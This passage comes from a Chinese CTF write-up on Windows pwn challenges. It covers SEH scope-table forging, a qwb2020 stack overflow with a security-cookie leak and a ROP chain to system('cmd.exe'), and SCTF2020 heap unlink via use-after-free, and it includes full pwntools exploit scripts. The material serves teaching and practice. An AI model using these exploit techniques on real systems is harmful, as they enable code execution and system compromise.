0x%x\n"</span>, &amp;v9);</span><br><span class="line">  sub_401420(<span class="string">"main address = 0x%x\n"</span>, main);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Do you want to know more?"</span>);</span><br><span class="line">    get_input((<span class="keyword">int</span>)&amp;v9, <span class="number">10</span>);</span><br><span class="line">    v7 = <span class="built_in">strcmp</span>(&amp;v9, <span class="string">"yes"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      v7 = -(v7 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">strcmp</span>(&amp;v9, <span class="string">"no"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">        v6 = -(v6 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      get_input((<span class="keyword">int</span>)&amp;v9, <span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Where do you want to know"</span>);</span><br><span class="line">      v5 = (_DWORD *)read_int();</span><br><span class="line">      sub_401420(<span class="string">"Address 0x%x value is 0x%x\n"</span>, v5, *v5);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I can tell you everything, but I never believe 1+1=2"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"AAAA, you kill me just because I don't think 1+1=2??"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察一下函数入口处，push了try_level，其值为-2，然后push了seh_scope，<code>__except_handler4</code>异常处理指针，push了<code>fs:[0]</code>，也就是next指针，再往后push了ms_exc.exc_ptr和old_esp。</p>
<p>ipad画了个自己能看懂的图标记了一下。可以将它想象成把一个大的结构体push到了栈上。</p>
<p><img src="/2020/12/24/winpwn/1.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000 CPPEH_RECORD    struc ; (sizeof=0x18, align=0x4, copyof_9)</span><br><span class="line">00000000                                         ; XREF: ___scrt_is_nonwritable_in_current_image/r</span><br><span class="line">00000000                                         ; _main/r ...</span><br><span class="line">00000000 old_esp         dd ?                    ; XREF: _main+36/w</span><br><span class="line">00000000                                         ; _main:final_func/r ...</span><br><span class="line">00000004 exc_ptr         dd ?                    ; XREF: __scrt_common_main_seh(void):$LN17/r</span><br><span class="line">00000004                                         ; ___scrt_is_nonwritable_in_current_image:loc_4019DE/r ; offset</span><br><span class="line">00000008 registration    _EH3_EXCEPTION_REGISTRATION ?</span><br><span class="line">00000008                                         ; XREF: _main+21/w</span><br><span class="line">00000008                                         ; _main+2D/o ...</span><br><span class="line">00000018 CPPEH_RECORD    ends</span><br><span class="line">//</span><br><span class="line">00000000 _EH3_EXCEPTION_REGISTRATION struc ; (sizeof=0x10, align=0x4, copyof_6)</span><br><span class="line">00000000                                         ; XREF: CPPEH_RECORD/r</span><br><span class="line">00000000 Next            dd ?                    ; offset</span><br><span class="line">00000004 ExceptionHandler dd ?                   ; offset</span><br><span class="line">00000008 ScopeTable      dd ?                    ; XREF: _main+21/w ; offset</span><br><span class="line">0000000C TryLevel        dd ?                    ; XREF: _main+57/w</span><br><span class="line">0000000C                                         ; _main:loc_40133F/w ...</span><br><span class="line">00000010 _EH3_EXCEPTION_REGISTRATION end</span><br></pre></td></tr></table></figure>
<p>seh_scope的结构如下，伪造的时候前面照抄，后面将两个函数指针改成后门地址。最后触发0地址访问错误进行异常函数调用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.rdata:00403688 init_seh_secope_table dd 0FFFFFFE4h           ; GSCookieOffset</span><br><span class="line">.rdata:00403688                                         ; DATA XREF: _main+5↑o</span><br><span class="line">.rdata:00403688                 dd 0                    ; GSCookieXOROffset</span><br><span class="line">.rdata:00403688                 dd 0FFFFFF20h           ; EHCookieOffset</span><br><span class="line">.rdata:00403688                 dd 0                    ; EHCookieXOROffset</span><br><span class="line">.rdata:00403688                 dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel</span><br><span class="line">.rdata:00403688                 dd offset execpt_func   ; ScopeRecord.FilterFunc</span><br><span class="line">.rdata:00403688                 dd offset final_func    ; ScopeRecord.HandlerFunc</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xt:004010B0 ; __unwind &#123; // __except_handler4</span><br><span class="line">.text:004010B0                 push    ebp</span><br><span class="line">.text:004010B1                 mov     ebp, esp</span><br><span class="line">.text:004010B3                 push    0FFFFFFFEh</span><br><span class="line">.text:004010B5                 push    offset init_seh_secope_table</span><br><span class="line">.text:004010BA                 push    offset __except_handler4</span><br><span class="line">.text:004010BF                 mov     eax, large fs:0</span><br><span class="line">.text:004010C5                 push    eax</span><br><span class="line">.text:004010C6                 add     esp, 0FFFFFF40h</span><br><span class="line">.text:004010CC                 mov     eax, ___security_cookie</span><br><span class="line">.text:004010D1                 xor     [ebp+ms_exc.registration.ScopeTable], eax</span><br><span class="line">.text:004010D4                 xor     eax, ebp</span><br><span class="line">.text:004010D6                 mov     [ebp+var_1C], eax</span><br><span class="line">.text:004010D9                 push    ebx</span><br><span class="line">.text:004010DA                 push    esi</span><br><span class="line">.text:004010DB                 push    edi</span><br><span class="line">.text:004010DC                 push    eax</span><br><span class="line">.text:004010DD                 lea     eax, [ebp+ms_exc.registration]</span><br><span class="line">.text:004010E0                 mov     large fs:0, eax</span><br><span class="line">.text:004010E6                 mov     [ebp+ms_exc.old_esp], esp</span><br><span class="line">.text:004010E9                 mov     [ebp+var_B8], 0</span><br><span class="line">.text:004010F3                 mov     [ebp+var_CC], 1</span><br><span class="line">.text:004010FD                 mov     [ebp+var_D0], 1</span><br><span class="line">.text:00401107 ;   __try &#123; // __except at final_func</span><br><span class="line">.text:00401107                 mov     [ebp+ms_exc.registration.TryLevel], 0</span><br><span class="line">.text:0040110E                 push    0               ; Size</span><br><span class="line">.text:00401110                 push    4               ; Mode</span><br><span class="line">.text:00401112                 push    0               ; Buf</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'10.210.108.240'</span>, <span class="number">10031</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn', 28789)</span></span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line"><span class="comment">#leak stack addr</span></span><br><span class="line">p.recvuntil(<span class="string">"stack address = 0x"</span>)</span><br><span class="line">stack_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"stack addr =&gt; "</span> + hex(stack_addr))</span><br><span class="line"><span class="comment">#leak main addr</span></span><br><span class="line">p.recvuntil(<span class="string">"main address = 0x"</span>)</span><br><span class="line">main_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">pe_base = main_addr - <span class="number">0x10b0</span></span><br><span class="line">ebp = stack_addr+<span class="number">0x9c</span></span><br><span class="line">log.success(<span class="string">"main addr =&gt; "</span> + hex(main_addr))</span><br><span class="line"><span class="comment">#leak gs</span></span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">p.sendline(str(stack_addr+<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"value is 0x"</span>)</span><br><span class="line">gs = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"gs =&gt; "</span> + hex(gs))</span><br><span class="line"></span><br><span class="line">security_cookie = gs ^ (stack_addr+<span class="number">0x9c</span>)</span><br><span class="line">log.success(<span class="string">"security_cookie =&gt; "</span> + hex(security_cookie))</span><br><span class="line"><span class="comment">#leak next</span></span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">p.sendline(str(ebp<span class="number">-0x10</span>))</span><br><span class="line">p.recvuntil(<span class="string">"value is 0x"</span>)</span><br><span class="line">next_p = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"next =&gt; "</span> + hex(next_p))</span><br><span class="line"><span class="comment">#fake scope</span></span><br><span class="line">back_door = pe_base + <span class="number">0x138d</span></span><br><span class="line">except_handler = pe_base + <span class="number">0x1460</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fake_scope = flat([</span></span><br><span class="line"><span class="string">    0x0FFFFFFFE,</span></span><br><span class="line"><span class="string">    0,</span></span><br><span class="line"><span class="string">    0x0FFFFFFCC,</span></span><br><span class="line"><span class="string">    0,</span></span><br><span class="line"><span class="string">    0xFFFFFFFE,</span></span><br><span class="line"><span class="string">    back_door</span></span><br><span class="line"><span class="string">    ])</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">fake_scope =flat([</span><br><span class="line">    <span class="number">0x0FFFFFFE4</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x0FFFFFF20</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x0FFFFFFFE</span>,</span><br><span class="line">    back_door,</span><br><span class="line">    back_door</span><br><span class="line">    ])</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span>+fake_scope.ljust(<span class="number">0x9c</span><span class="number">-0x1c</span><span class="number">-0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p32(gs)+<span class="string">'c'</span>*<span class="number">0x8</span>+flat([</span><br><span class="line">    next_p,<span class="comment">#ebp-0x10</span></span><br><span class="line">    except_handler,</span><br><span class="line">    (stack_addr+<span class="number">0x10</span>) ^ security_cookie,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"noo"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Where do you want to know\r\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="qwb2020-easyoverflow"><a href="#qwb2020-easyoverflow" class="headerlink" title="qwb2020-easyoverflow"></a>qwb2020-easyoverflow</h2><h3 id="程序逻辑-amp-amp-漏洞利用-1"><a href="#程序逻辑-amp-amp-漏洞利用-1" class="headerlink" title="程序逻辑 &amp;&amp; 漏洞利用"></a>程序逻辑 &amp;&amp; 漏洞利用</h3><p>程序没有开CFG，有栈溢出，可以leak三次数据。</p>
<p>由于win的地址随机化的原因，我们先leak出pe_base/ntdll_base，然后leak gs，利用栈溢出的rop将security_cookie泄露出来进而异或得到rsp栈地址，注意此时pop rbx=1可以重复进行rop，再二次溢出根据read@iat得到ucrtdll_base，第三次溢出执行system(“cmd.exe”)。</p>
<p>win x64的前四个参数寄存器为rcx rdx r8 r9。</p>
<p>注意后面溢出的时候rsp值改变，相应的gs值也要修改为new_rsp ^ security_cookie。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">main_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  FILE *v1; <span class="comment">// rax</span></span><br><span class="line">  FILE *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [rsp+20h] [rbp-118h]</span></span><br><span class="line"></span><br><span class="line">  v0 = (FILE *)_acrt_iob_func(<span class="number">0</span>i64);</span><br><span class="line">  setbuf(v0, <span class="number">0</span>i64);</span><br><span class="line">  v1 = (FILE *)_acrt_iob_func(<span class="number">1</span>i64);</span><br><span class="line">  setbuf(v1, <span class="number">0</span>i64);</span><br><span class="line">  v2 = (FILE *)_acrt_iob_func(<span class="number">2</span>i64);</span><br><span class="line">  setbuf(v2, <span class="number">0</span>i64);</span><br><span class="line">  v3 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    --v3;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;Dst, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"buffer:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;Dst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'10.210.108.240'</span>, <span class="number">10030</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"input:\r\n"</span>, <span class="string">"a"</span>*size)</span><br><span class="line">    p.recvuntil(<span class="string">"buffer:\r\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"a"</span>*size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ntdll</span></span><br><span class="line">p_rdx_rcx_r8_r9_r2 = <span class="number">0x8B540</span></span><br><span class="line">p_rbx = <span class="number">0xF70BF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pe file</span></span><br><span class="line">puts_offset = <span class="number">0x10a6</span></span><br><span class="line">read_import = <span class="number">0x2178</span></span><br><span class="line">cookie_offset = <span class="number">0x3008</span></span><br><span class="line">ret_address = <span class="number">0x10ca</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ucrtbase</span></span><br><span class="line">system_address = <span class="number">0xae5d0</span></span><br><span class="line">cmd_address = <span class="number">0xd0c00</span></span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">leak(<span class="number">0x100</span>)</span><br><span class="line">gs_value = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"gs_value &#123;&#125;"</span>.format(hex(gs_value)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak(0x118)</span></span><br><span class="line"><span class="comment"># pe_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x12f4</span></span><br><span class="line"><span class="comment"># log.success("pe base &#123;&#125;".format(hex(pe_base)))</span></span><br><span class="line"><span class="comment">#leak(0x118)</span></span><br><span class="line"><span class="comment">#pe_base = u64(p.recvn(6).ljust(8,'\x00')) - 0x12f4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak ntdll</span></span><br><span class="line">pe_base = <span class="number">0x7ff69f6e0000</span></span><br><span class="line">log.success(<span class="string">"pe base =&gt; "</span> + hex(pe_base))</span><br><span class="line">leak(<span class="number">0x188</span>)</span><br><span class="line">ntdll_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x4cec1</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">ntdll_base = <span class="number">0x7ffddc5d0000</span></span><br><span class="line">log.success(<span class="string">"ntdll base =&gt; "</span> + hex(ntdll_base))</span><br><span class="line"><span class="comment">#leak s_cookie</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(gs_value)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(ntdll_base+p_rdx_rcx_r8_r9_r2)+p64(<span class="number">0</span>)+p64(pe_base+cookie_offset)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(ntdll_base+p_rbx)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pe_base+puts_offset)</span><br><span class="line">p.recvuntil(<span class="string">"input:\r\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">security_cookie = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"security cookie =&gt; "</span> + hex(security_cookie))</span><br><span class="line">old_rsp = security_cookie ^ gs_value</span><br><span class="line">log.success(<span class="string">"old rsp =&gt; "</span> + hex(old_rsp))</span><br><span class="line">new_rsp = old_rsp + <span class="number">0x188</span></span><br><span class="line">input_addr = new_rsp + <span class="number">0x20</span></span><br><span class="line">new_gs = new_rsp ^ security_cookie</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"new rsp =&gt; "</span> + hex(new_rsp))</span><br><span class="line">log.success(<span class="string">"new gs =&gt; "</span> + hex(new_gs))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(new_gs)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(ntdll_base+p_rdx_rcx_r8_r9_r2)+p64(<span class="number">0</span>)+p64(pe_base+read_import)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(ntdll_base+p_rbx)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pe_base+puts_offset)</span><br><span class="line">p.recvuntil(<span class="string">"input:\r\n"</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ucrt = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">ucrt_base = ucrt - <span class="number">0x17bc0</span></span><br><span class="line">log.success(<span class="string">"ucrt base =&gt; "</span> + hex(ucrt_base))</span><br><span class="line"></span><br><span class="line">new_rsp = new_rsp + <span class="number">0x188</span></span><br><span class="line">new_gs = new_rsp ^ security_cookie</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(new_gs)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(ntdll_base+p_rdx_rcx_r8_r9_r2)+p64(<span class="number">0</span>)+p64(ucrt_base+cmd_address)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(ucrt_base+system_address)</span><br><span class="line">p.recvuntil(<span class="string">"input:\r\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="SCTF2020-EasyWinHeap"><a href="#SCTF2020-EasyWinHeap" class="headerlink" title="SCTF2020-EasyWinHeap"></a>SCTF2020-EasyWinHeap</h2><h3 id="程序逻辑-amp-漏洞利用"><a href="#程序逻辑-amp-漏洞利用" class="headerlink" title="程序逻辑 &amp; 漏洞利用"></a>程序逻辑 &amp; 漏洞利用</h3><p>堆菜单题，有溢出和UAF。bss上先分配了一大块堆地址用于存放chunks，先UAF+Show leak出heap_addr，进而unlink达到任意地址写的效果。</p>
<p>这里多提一下win的unlink，在AngelBoy的Slide里有提到win的unlink更加简单，因为flink和blink指向的是data_ptr，因此只需要伪造<code>fd = &amp;p-8，bk= &amp;p</code>即可。另外为了绕过检查我们需要先释放chunk1 chunk3，再编辑chunk1，这样是为了绕过list_head的检查。另外很有意思的是在后面的一个check失败的情况下程序也不会abort，而是阻止新chunk插入链表，详情可以看ppt。之后再释放chunk0即可触发unlink，地址任意写，将chunk_addr改成heap_addr来leak上面的pe_addr，最后在iat表泄露出urctbase，通过<code>s -a 0 L?80000000/2 &quot;cmd.exe&quot;</code>搜索cmd字符串，通过<code>u ucrtbase!system</code>查看system函数地址，最后任意地址写将函数指针改为system，布置cmd到堆上。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// eax</span></span><br><span class="line">  FILE *v1; <span class="comment">// eax</span></span><br><span class="line">  FILE *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> (__cdecl *v3)(<span class="keyword">const</span> <span class="keyword">char</span> *); <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> global_idx; <span class="comment">// esi</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// eax</span></span><br><span class="line">  SIZE_T v6; <span class="comment">// ST34_4</span></span><br><span class="line">  LPVOID chunk_addr; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx1; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v19; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v0 = (FILE *)_acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setvbuf(v0, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = (FILE *)_acrt_iob_func(<span class="number">1</span>);</span><br><span class="line">  setvbuf(v1, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  v2 = (FILE *)_acrt_iob_func(<span class="number">2</span>);</span><br><span class="line">  setvbuf(v2, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  hHeap = HeapCreate(<span class="number">1u</span>, <span class="number">0x2000</span>u, <span class="number">0x2000</span>u);</span><br><span class="line">  v3 = (<span class="keyword">void</span> (__cdecl *)(<span class="keyword">const</span> <span class="keyword">char</span> *))<span class="built_in">puts</span>;</span><br><span class="line">  dword_40338C = (<span class="keyword">int</span>)HeapAlloc(hHeap, <span class="number">9u</span>, <span class="number">0x80</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3(<span class="string">"/----------------------\\"</span>);</span><br><span class="line">    v3(<span class="string">"|   1: Alloc.          |"</span>);</span><br><span class="line">    v3(<span class="string">"|   2: Delete.         |"</span>);</span><br><span class="line">    v3(<span class="string">"|   3: Show.           |"</span>);</span><br><span class="line">    v3(<span class="string">"|   4: Edit.           |"</span>);</span><br><span class="line">    v3(<span class="string">"|   5: Exit.           |"</span>);</span><br><span class="line">    v3(<span class="string">"\\----------------------/"</span>);</span><br><span class="line">    v3(<span class="string">"option &gt;"</span>);</span><br><span class="line">    Scanf(<span class="string">"%ud"</span>, &amp;choice);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        global_idx = <span class="number">0</span>;</span><br><span class="line">        v5 = (_DWORD *)(dword_40338C + <span class="number">0xC</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v3(<span class="string">"index &gt;"</span>);</span><br><span class="line">        Scanf(<span class="string">"%ud"</span>, &amp;idx);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( idx &gt;= <span class="number">0x10</span> || !*(_DWORD *)(dword_40338C + <span class="number">8</span> * idx + <span class="number">4</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">        HeapFree(hHeap, <span class="number">1u</span>, *(LPVOID *)(dword_40338C + <span class="number">8</span> * idx + <span class="number">4</span>));<span class="comment">// UAF</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3(<span class="string">"index &gt;"</span>);</span><br><span class="line">        Scanf(<span class="string">"%ud"</span>, &amp;idx1);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( idx1 &gt;= <span class="number">0x10</span> || !*(_DWORD *)(dword_40338C + <span class="number">8</span> * idx1 + <span class="number">4</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">        ((<span class="keyword">void</span> (__cdecl *)(_DWORD))(*(_DWORD *)(dword_40338C + <span class="number">8</span> * idx1) &amp; <span class="number">0xFFFFFFF0</span>))(*(_DWORD *)(dword_40338C</span><br><span class="line">                                                                                                  + <span class="number">8</span> * idx1</span><br><span class="line">                                                                                                  + <span class="number">4</span>));</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v3(<span class="string">"index &gt;"</span>);</span><br><span class="line">        Scanf(<span class="string">"%ud"</span>, &amp;v16);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( v16 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">        v9 = <span class="number">8</span> * v16;</span><br><span class="line">        <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">8</span> * v16 + dword_40338C + <span class="number">4</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">        v3(<span class="string">"content  &gt;"</span>);</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        v11 = *(_DWORD *)(v9 + dword_40338C);</span><br><span class="line">        v12 = *(_DWORD *)(v9 + dword_40338C + <span class="number">4</span>);</span><br><span class="line">        v15 = <span class="number">16</span> * (v11 &amp; <span class="number">0xF</span>);</span><br><span class="line">        v13 = getchar();</span><br><span class="line">        <span class="keyword">if</span> ( v13 != <span class="number">10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(v10++ + v12) = v13;</span><br><span class="line">            <span class="keyword">if</span> ( v10 == v15 - <span class="number">1</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v13 = getchar();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v13 != <span class="number">10</span> );</span><br><span class="line">          v3 = (<span class="keyword">void</span> (__cdecl *)(<span class="keyword">const</span> <span class="keyword">char</span> *))<span class="built_in">puts</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(_BYTE *)(v10 + v12) = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> 